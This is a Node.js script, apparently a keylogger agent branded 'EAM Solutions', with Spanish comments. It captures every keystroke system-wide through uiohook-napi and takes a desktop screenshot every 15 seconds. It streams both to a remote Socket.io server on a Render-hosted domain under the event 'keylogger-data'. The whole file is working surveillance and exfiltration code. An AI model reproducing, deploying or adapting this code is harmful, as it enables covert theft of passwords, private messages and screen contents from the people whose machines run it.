#!/usr/bin/env node
const io = require('socket.io-client');
const uiohookModule = require('uiohook-napi');
const screenshot = require('screenshot-desktop');
const os = require('os');

// --- DETECCIÓN DINÁMICA DE LA LIBRERÍA ---
let uiohook = null;
if (uiohookModule.on) uiohook = uiohookModule;
else if (uiohookModule.uiohook && uiohookModule.uiohook.on) uiohook = uiohookModule.uiohook;
else if (uiohookModule.uIOhook) uiohook = uiohookModule.uIOhook;
else if (uiohookModule.default) uiohook = uiohookModule.default;

if (!uiohook || !uiohook.on) {
    console.error("❌ Error: No se pudo inicializar uiohook-napi.");
    process.exit(1);
}

// --- CONFIGURACIÓN PARA RENDER ---
// Ya no usamos IP ni Puerto, usamos la URL directa de Render
const serverUrl = 'https://eamsolutions.onrender.com';
const config = {
  label: os.hostname()
};

// Conexión segura con Socket.io
const socket = io(serverUrl, { 
    transports: ['websocket'],
    secure: true,
    reconnection: true
});

console.log(`\n🚀 AGENTE EAM SOLUTIONS ACTIVO: ${config.label}`);
console.log(`🔗 CONECTANDO A RENDER: ${serverUrl}\n`);

// --- MAPEO DE TECLAS ---
const keyMap = {
    1: '[ESC]', 14: '[BORRAR]', 15: '[TAB]', 28: '\n', 29: '[CTRL]', 42: '[SHIFT]', 56: '[ALT]', 57: ' ',
    2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
    16: 'Q', 17: 'W', 18: 'E', 19: 'R', 20: 'T', 21: 'Y', 22: 'U', 23: 'I', 24: 'O', 25: 'P',
    30: 'A', 31: 'S', 32: 'D', 33: 'F', 34: 'G', 35: 'H', 36: 'J', 37: 'K', 38: 'L',
    44: 'Z', 45: 'X', 46: 'C', 47: 'V', 48: 'B', 49: 'N', 50: 'M',
    57416: '[UP]', 57424: '[DOWN]', 57419: '[LEFT]', 57421: '[RIGHT]', 3653: '[SUPR]'
};

// --- FUNCIONES DE ENVÍO ---

function sendKey(keyChar) {
    if (!socket.connected) return;
    
    const payload = {
        time: new Date().toISOString(),
        log: keyChar,
        remoteIp: config.label,
        capture: '' 
    };
    
    socket.emit('keylogger-data', payload);
    process.stdout.write(keyChar); 
}

async function sendScreenshot() {
    if (!socket.connected) return;

    try {
        const img = await screenshot({ format: 'png' });
        const payload = {
            time: new Date().toISOString(),
            log: '[SCREENSHOT AUTOMÁTICA]',
            remoteIp: config.label,
            capture: img.toString('base64')
        };
        socket.emit('keylogger-data', payload);
        console.log('\n📸 Captura enviada a Render.');
    } catch (err) {
        console.error('\n❌ Error en screenshot:', err.message);
    }
}

// --- EVENTOS ---

uiohook.on('keydown', (event) => {
    if (event.keycode === 1) cleanup(); 
    let char = keyMap[event.keycode] || `[K${event.keycode}]`;
    sendKey(char);
});

// Enviar captura cada 15 segundos para no saturar el plan gratuito de Render
setInterval(sendScreenshot, 15000);

socket.on('connect', () => {
    console.log('✅ ESTADO: Conectado a Render. Transmitiendo datos...');
});

socket.on('connect_error', (err) => {
    console.error('❌ Error de conexión:', err.message);
});

socket.on('disconnect', () => {
    console.log('❌ ESTADO: Desconectado de Render.');
});

function cleanup() {
    try { uiohook.stop(); } catch(e) {}
    socket.disconnect();
    process.exit(0);
}

process.on('SIGINT', cleanup);
uiohook.start();